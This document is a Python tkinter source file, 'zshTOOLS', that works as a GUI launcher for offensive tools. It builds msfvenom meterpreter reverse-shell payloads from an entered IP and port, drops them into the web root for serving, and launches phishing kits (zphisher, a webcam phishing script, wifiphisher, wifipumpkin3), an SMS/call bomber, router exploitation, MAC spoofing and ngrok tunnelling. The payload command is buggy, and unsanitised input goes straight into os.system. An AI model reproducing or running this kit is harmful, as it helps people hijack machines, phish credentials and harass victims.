import os
#ONLY FOR GNOME :
os.system("xhost +") #remove this line if your arn't using GNOME!
import tkinter as tk
from tkinter.ttk import *
import tkinter.messagebox
#from pygame import mixer 
os.system("clear")
import pyautogui
from pyfiglet import Figlet
import webbrowser
from time import sleep


#mixer.init()
username = "/home/redskull-linux"
def exittest(): #IMP DON'T DELETE
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	response = tkinter.messagebox.askyesno('EXIT', 'Are You Sure ?')
	if response:
		'''mixer.music.load(username+'/intro.wav')
		mixer.music.set_volume(0.9)
		mixer.music.play()'''
		print("SHUTTING DOWN\nPLEASE WAIT... :P")
		sleep(2)
		r.destroy()
#root
os.system("toilet --gay -w 100     MEER TARBANI")
r = tk.Tk()
r.title('zshTOOLS - Meer Tarbani')
ph1 = tk.PhotoImage(file = username+'/zshtools.png')
r.iconphoto(False, ph1)
menubar = tk.Menu(r)

#dist
dump = "xterm -e"

#more menu
More = tk.Menu(menubar, tearoff = 0)
menubar.add_cascade(label = 'More', menu = More, activebackground='red')

#xterm
def xterm():
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	os.system("xterm")
More.add_command(label = 'XTERM', command = xterm, activebackground='red',background='black',foreground='red')

#info
def onClick():
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	#playsound('toolvol.wav')
	custom_fig = Figlet(font='slant',width=100)
	tkinter.messagebox.showinfo("INFO","CREATED BY MEER TARBANI\n\nINCLUDES TOOLS...\n\nAIRGEDDON       ROUTERSPLOIT\nXEROSPLOIT	EVILLIMITER\nTBOMB\n"+custom_fig.renderText('z s h\nT o o l s'))
More.add_command(label = 'INFO', command = onClick, activebackground='red',background='black',foreground='red')

More.add_separator(background='black')
#apache server
def apache():
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	os.system("sudo systemctl start apache2 && sudo systemctl status apache2")
	tkinter.messagebox.showinfo("INFO", "STARTED SUCCESSFULLY")
	
More.add_command(label = 'START Apache2', command = apache, activebackground='red',background='black',foreground='red')

def sapache():
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	os.system("sudo systemctl stop apache2 && sudo systemctl status apache2")
	tkinter.messagebox.showinfo("INFO", "STOPPED SUCCESSFULLY")
	
More.add_command(label = 'STOP Apache2', command = sapache, activebackground='red',background='black',foreground='red')

More.add_separator(background='black')

def clr():
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	os.system("clear && toilet --gay -w 100 MEER TARBANI")

More.add_command(label = 'CLEAR', command = clr, activebackground='red',background='black',foreground='red')

def reboot():
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	tkinter.messagebox.showinfo("ALERT", "\nREQUEST FOR REBOOT\n\nCLICK OK TO REBOOT!")
	tkinter.messagebox.showinfo("ALERT", "      REBOOT DONE!\n\nCLICK OK TO CONTINUE!")
	r.destroy()
	os.system("sudo python3 "+username+"/zshTOOLS.py")
More.add_command(label = 'REBOOT', command=reboot, activebackground='red',background='black',foreground='red')

More.add_command(label = 'EXIT', command = exittest, activebackground='red',background='black',foreground='red')

#menu2
MSF = tk.Menu(menubar, tearoff = 0)
menubar.add_cascade(label = 'MSF', menu = MSF, activebackground='red')


#payload

#loc = ip
#por = port
#fil = file
#sys = operating system
#thp = tcp/http/https

loc_var=tk.StringVar()
por_var=tk.StringVar()
fil_var=tk.StringVar()
sys_var=tk.StringVar()
thp_var=tk.StringVar()

def exploit():
	os.system("sudo msfvenom -p "+sys_var.get()+"/meterpreter/reverse_"+thp_var.get()+" LHOST="+loc_var.get()+" "+"LHOST="+por_var.get()+" "+"R > /var/www/html/"+fil_var.get())
	print(sys_var.get())
	print(thp_var.get())
	print(loc_var.get())
	print(por_var.get())
	print("/var/www/html/"+fil_var.get())
	tkinter.messagebox.showinfo("INFO","OS : "+sys_var.get()+"\nTHP"+thp_var.get()+"\nIP : "+loc_var.get()+"\nPORT : "+por_var.get()+"\nAt : /var/www/html/\nAs : "+fil_var.get())



def addClick():
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	sys_label = tk.Label(r, text = 'Enter OS : ').pack()
	sys_entry = tk.Entry(r, textvariable = sys_var).pack()
	thp_label = tk.Label(r, text = 'Enter THP (tcp/http/https) : ').pack()
	thp_entry = tk.Entry(r, textvariable = thp_var).pack()
	loc_label = tk.Label(r, text = 'Enter IP : ').pack()
	loc_entry = tk.Entry(r, textvariable = loc_var).pack()
	por_label = tk.Label(r, text = 'Enter Port : ').pack()
	por_entry = tk.Entry(r, textvariable = por_var).pack()
	fil_label = tk.Label(r, text = 'Enter File Name : ').pack()
	fil_entry = tk.Entry(r, textvariable = fil_var).pack()
	sub_btn = tk.Button(r, text = 'Go', command = exploit, bg ='black',fg='white' ,activebackground='red').pack()
	

MSF.add_command(label = 'PAYLOAD', command = addClick, activebackground='red',background='black',foreground='red')

#console

def console():
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	os.system("msfconsole")
	

MSF.add_command(label = 'CONSOLE', command = console, activebackground='red',background='black',foreground='red')
MSF.add_separator(background='black')

def armitage():
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	print("STARTING ARMITAGE ///")
	os.system("sudo armitage")
MSF.add_command(label = 'ARMITAGE \n MSF - GUI', command = armitage, activebackground='red',background='black',foreground='red')


#menu3

SCAN = tk.Menu(menubar, tearoff = 0)
menubar.add_cascade(label = 'SCAN', menu = SCAN, activebackground='red')

#scan networks

def scannet():
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	pyautogui.alert("Please Check that MONITOR MODE Should Be STARTED!")
	pyautogui.alert("Press CTRL + C To STOP!")
	os.system(dump + " airodump-ng wlan0; sleep 1000")

SCAN.add_command(label = 'SCAN Networks', command = scannet, activebackground='red',background='black',foreground='red')

def scannetw():
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	pyautogui.alert("Please Check that MONITOR MODE Should Be STARTED!")
	pyautogui.alert("Press CTRL + C To STOP!")
	os.system(dump + " wash -i wlan0; sleep 1000")

SCAN.add_command(label = 'SCAN Networks \n USING WASH (WPS)', command = scannetw, activebackground='red',background='black',foreground='red')
SCAN.add_separator(background='black')

#nmap

def nmap():
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	os.system("nmap -h")
	os.system("xterm")
SCAN.add_command(label = 'NMAP', command = nmap, activebackground='red',background='black',foreground='red')

#wireshark

def wireshark():
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	os.system("wireshark")

SCAN.add_command(label = 'WIRESHARK', command = wireshark, activebackground='red',background='black',foreground='red')

#ettercap

def ettercap():
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	os.system("ettercap -G")
	
SCAN.add_command(label = 'ETTERCAP', command = ettercap, activebackground='red',background='black',foreground='red')

#Angry IPSCANNER

def angryip():
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	os.system("sudo ipscan")

SCAN.add_command(label = 'IP SCANNER', command = angryip, activebackground='red',background='black',foreground='red')

#monitor mode 

SCAN.add_separator(background='black')

def monitoron():
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	pyautogui.alert("Disconnect From Any Connected WiFi")
	os.system("airmon-ng start wlan0")
	pyautogui.alert("Monitor Mode STARTED Successfully!")
	
SCAN.add_command(label = 'START Monitor Mode', command = monitoron, activebackground='red',background='black',foreground='red')

def monitoroff():
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	os.system("ifconfig wlan0 down")
	os.system("iwconfig wlan0 mode Managed")
	os.system("ifconfig wlan0 up")
	pyautogui.alert("Monitor Mode STOPPED Successfully!")
SCAN.add_command(label = 'STOP Monitor Mode', command = monitoroff, activebackground='red',background='black',foreground='red')

#Menu 4

MAC = tk.Menu(menubar, tearoff = 0)
menubar.add_cascade(label = 'MAC', menu = MAC, activebackground='red')

int_var=tk.StringVar()
ranint = str(int_var.get())
cus_var=tk.StringVar()
cussmac = str(cus_var.get())
#Random MAC

def ran():
	os.system("ifconfig "+int_var.get()+" down")
	os.system("macchanger -r "+int_var.get())
	os.system("ifconfig "+int_var.get()+" up")
	ranint = str(int_var.get())
	tkinter.messagebox.showinfo("MACCHANGER", "MAC ADDRESS FOR "+ranint+" HAS BEEN CHANGED RANDOMLY!")


def ranmac():
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	rmac_label = tk.Label(r, text = 'Enter INTERFACE NAME : ').pack()
	rmac_entry = tk.Entry(r, textvariable = int_var).pack()
	sub_btn = tk.Button(r, text = 'Go', command = ran,bg ='black',fg='white' ,activebackground='red').pack()
MAC.add_command(label='RANDOM MAC', command = ranmac, activebackground='red',background='black',foreground='red')

#Custom MAC

def cus():
	os.system("ifconfig "+int_var.get()+" down")
	os.system("macchanger -m "+cus_var.get()+" "+int_var.get())
	os.system("ifconfig "+int_var.get()+" up")
	ranint = str(int_var.get())
	cussmac = str(cus_var.get())
	tkinter.messagebox.showinfo("MACCHANGER", "MAC ADDRESS FOR "+ranint+" HAS BEEN CHANGED TO "+cussmac)

def cusmac():
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	cint_label = tk.Label(r, text = 'ENTER INTERFACE NAME : ').pack()
	cint_entry = tk.Entry(r, textvariable=int_var).pack()
	cmac_label = tk.Label(r, text = 'ENTER CUSTOM MAC : ').pack()
	cmac_entry = tk.Entry(r, textvariable=cus_var).pack()
	sub_btn = tk.Button(r, text = 'Go', command = cus, bg ='black',fg='white' ,activebackground='red').pack()
MAC.add_command(label = 'CUSTOM MAC', command = cusmac, activebackground='red',background='black',foreground='red')

#Permanent MAC

def per():
	os.system("ifconfig "+int_var.get()+" down")
	os.system("macchanger -p "+int_var.get())
	os.system("ifconfig "+int_var.get()+" up")
	ranint = str(int_var.get())
	tkinter.messagebox.showinfo("MACCHANGER", "MAC ADDRESS FOR "+ranint+" HAS BEEN RESET TO PERMANENT!")

def permac():
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	pint_label = tk.Label(r, text = 'ENTER INTERFACE NAME : ').pack()
	pint_entry = tk.Entry(r, textvariable=int_var).pack()
	sub_btn = tk.Button(r, text = 'Go', command = per, bg ='black',fg='white' ,activebackground='red').pack()
MAC.add_command(label = 'PERMANENT MAC', command=permac, activebackground='red',background='black',foreground='red')

#music

'''mixer.music.load(username+'/intro.wav')
mixer.music.set_volume(0.9)
mixer.music.play()'''

#heading

heading = tk.Label(r, text = "zshTOOLS")
heading.config(font = ("Fira Code Medium", 18), bg = 'red', fg = 'black')
heading.pack()

#tools
def airgeddon():
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	os.system("sudo bash "+username+"/airgeddon/airgeddon.sh")
airgeddonbt = tk.Button(r, text='AIRGEDDON', bg ='black',fg='white' ,activebackground='red', width=30, command=airgeddon)
airgeddonbt.pack()

def rsf():
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	os.system("sudo python3 "+username+"/routersploit/rsf.py")
rsfbt = tk.Button(r, text='ROUTERSPLOIT', bg ='black',fg='white' ,activebackground='red',width=30, command=rsf)
rsfbt.pack()

def xerosploit():
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	os.system("sudo python3 "+username+"/xerosploit/xerosploit.py")
xerosploitbt = tk.Button(r, text='XEROSPLOIT', bg ='black',fg='white' ,activebackground='red', width=30, command=xerosploit)
xerosploitbt.pack()

def evillimiter():
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	os.system("sudo python3 "+username+"/evillimiter/bin/evillimiter")
evillimterbt = tk.Button(r, text='EVILLIMITER', bg ='black',fg='white' ,activebackground='red', width=30, command=evillimiter)
evillimterbt.pack()

def tbomb():
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	os.system("sudo bash "+username+"/TBomb/TBomb.sh")
tbombbt = tk.Button(r, text='TBOMB', activebackground='red', bg ='black',fg='white' ,width=30, command=tbomb)
tbombbt.pack()
#port forwarding

inter_var=tk.StringVar()
ports_var=tk.StringVar()

def portex():
	tkinter.messagebox.showinfo("INFO", "PORT FORWARDING FOR PORT \n"+ports_var.get()+" : "+inter_var.get()+"\nCLICK OK TO START!")
	os.system("./ngrok "+inter_var.get()+" "+ports_var.get())
	print("Selected : "+inter_var.get()+" Port : "+ports_var.get())


def portfor():
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	inter_label = tk.Label(r, text = 'Enter THP\n(TCP/HTTP) : ').pack()
	inter_entry = tk.Entry(r, textvariable = inter_var).pack()
	ports_label = tk.Label(r, text = 'Enter PORT NO. : ').pack()
	ports_entry = tk.Entry(r, textvariable = ports_var).pack()
	sub_btn = tk.Button(r, text = 'Go', command = portex).pack()

portsbt = tk.Button(r, text = 'PORT FORWARDING', bg ='black',fg='white' ,activebackground='red', width = 30, command=portfor)
portsbt.pack()

#cam phish

def camphish():
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	os.system("bash "+username+"/CamHacker/ch.sh")

cambt = tk.Button(r, text = 'CAM PHISH', activebackground='red', bg ='black',fg='white' ,width = 30, command=camphish)
cambt.pack()

#lazy script

def lscript():
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	pyautogui.alert('PLEASE NOTE\nTHIS TOOL IS IN TESTING!!')
	os.system("sudo bash "+username+"/lscript/l")

lscriptbt = tk.Button(r, text = 'LAZY SCRIPT', bg ='black',fg='white' ,activebackground='red', width = 30, command=lscript)
lscriptbt.pack()

#zphisher

def zphisher():
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	os.system("cd zphisher&&bash zphisher.sh")

zphish = tk.Button(r, text = 'Z PHISHER',bg ='black',fg='white' , activebackground='red', width=30, command=zphisher)
zphish.pack()

#wifiphisher

def wifiphisher():
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	pyautogui.alert('	    PLEASE NOTE : \n\nYOUR ADAPTER MUST SUPPORT AP MODE!!')
	os.system("sudo wifiphisher")

wphishbt = tk.Button(r, text = 'WIFIPHISHER',bg ='black',fg='white' , activebackground='red', width=30, command = wifiphisher)
wphishbt.pack()

#wifipumpkin3

def wifipumpkin():
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	pyautogui.alert('	     PLEASE NOTE : \n\nYOUR ADAPTER MUST SUPPORT AP MODE\n      FOR CAPTIVE PROTAL ATTACKS!!')
	os.system("sudo wifipumpkin3")

wpumpbt = tk.Button(r, text = 'WIFIPUMPKIN 3',bg ='black',fg='white' , activebackground='red', width=30, command = wifipumpkin)
wpumpbt.pack()

#IN-TESTING

def others():
	'''mixer.music.load(username+"/toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()'''
	
	r.destroy()
	os.system("clear")
	os.system("toilet --gay -w 100     MEER TARBANI")
	
	r1 = tk.Tk()
	r1.title('zshTOOLS - Meer Tarbani')
	username1 = "/home/redskull-linux"
	ph2 = tk.PhotoImage(file = username1+'/zshtools.png')
	r1.iconphoto(False, ph2)
	#mixer.init()

	def exittest1(): #IMP DON'T DELETE
		response = tkinter.messagebox.askyesno('EXIT', 'Are You Sure ?')
		if response:
			print("SHUTTING DOWN\nPLEASE WAIT... :P")
			sleep(2)
			r1.destroy()

	#kde
	def kde():
		'''mixer.music.load(username+"/toolvol.wav")
		mixer.music.set_volume(0.9)
		mixer.music.play()'''
		os.system("kdeconnect-app")
	kdebt = tk.Button(r1, text = 'KDE CONNECT',bg ='black',fg='white' , activebackground='red', width = 30, command = kde)
	kdebt.pack()

	#code
	def code():
		'''mixer.music.load(username+"/toolvol.wav")
		mixer.music.set_volume(0.9)
		mixer.music.play()'''
		os.system("code")
	codebt = tk.Button(r1, text = 'VS CODE',bg ='black',fg='white' , activebackground='red', width=30, command = code)
	codebt.pack()

	#eDEX - ui
	def eDEX():
		'''mixer.music.load(username+"/toolvol.wav")
		mixer.music.set_volume(0.9)
		mixer.music.play()'''
		tkinter.messagebox.showinfo("ALERT","YOU SHOULDN'T HAD TO A SUDO USER!")
		os.system("./eDEX.AppImage")
	edex = tk.Button(r1, text = 'eDEX - UI',bg ='black',fg='white' , activebackground='red', width=30, command=eDEX)
	edex.pack()

	tel_var = tk.StringVar()
	
	#telnet
	def telnet():
		os.system("telnet "+tel_var.get())
		tkinter.messagebox.showinfo("SUCCESS", "CONNECTED TO "+tel_var.get()+" SUCESSFULLY!")
	
	def telnetp():
		'''mixer.music.load(username+"/toolvol.wav")
		mixer.music.set_volume(0.9)
		mixer.music.play()'''
		tel_label = tk.Label(r1, text = 'TELNET : ENTER IP', activebackground='red').pack()
		tel_entry = tk.Entry(r1, textvariable=tel_var).pack()
		sub_btn = tk.Button(r1, text='Go',bg ='black',fg='white' , activebackground='red', command=telnet).pack()
	telbtn = tk.Button(r1, text='TELNET', bg ='black',fg='white' , activebackground='red',width=30, command=telnetp)
	telbtn.pack()


	#EDIT ABOVE!!!
	def visitus():
		'''mixer.music.load(username+"/toolvol.wav")
		mixer.music.set_volume(0.9)
		mixer.music.play()'''
		webbrowser.open('https://www.instagram.com/127.0.0.1.exe/')
	visitbt = tk.Button(r1, text = 'VISIT US',bg ='black',fg='white' , activebackground = 'red',width = 30, command = visitus)
	visitbt.pack()

	def DONATE():
		'''mixer.music.load(username+"/toolvol.wav")
		mixer.music.set_volume(0.9)
		mixer.music.play()'''
		tkinter.messagebox.showinfo("ALERT", "\n    CHECK BACK LATER.\n\nTHIS OPTION IS STILL IN TESTING!")
	donatebt = tk.Button(r1, text = 'DONATE US',bg ='black',fg='white' , activebackground='red',width = 30, command=DONATE)
	donatebt.pack()

	#exitloop For R1
	def back():
		'''mixer.music.load(username+"/toolvol.wav")
		mixer.music.set_volume(0.9)
		mixer.music.play()'''
		r1.destroy()
		os.system("sudo python3 zshTOOLS.py")
	backbt = tk.Button(r1, text='BACK',bg ='red', activebackground='black', width = 30, command = back)
	backbt.pack()

	exitbt = tk.Button(r1, text='EXIT',bg = 'red', activebackground='black', width = 30, command = exittest1)
	exitbt.pack()
	r1.protocol('WM_DELETE_WINDOW', exittest1)
	r1.config(bg = 'black')
	r1.mainloop()

othersbt = tk.Button(r, text = 'OTHERS', bg ='black',fg='white' ,activebackground='red', width = 30, command=others)
othersbt.pack()

#exit

exitbt = tk.Button(r, text='EXIT', bg='red', activebackground='black', width=30, command = exittest)
exitbt.pack()

#rootexit
menubar.config(bg= 'black', fg='red', activebackground='red')
r.config(menu = menubar, width=5, bg='black')
r.protocol('WM_DELETE_WINDOW',exittest)
r.mainloop()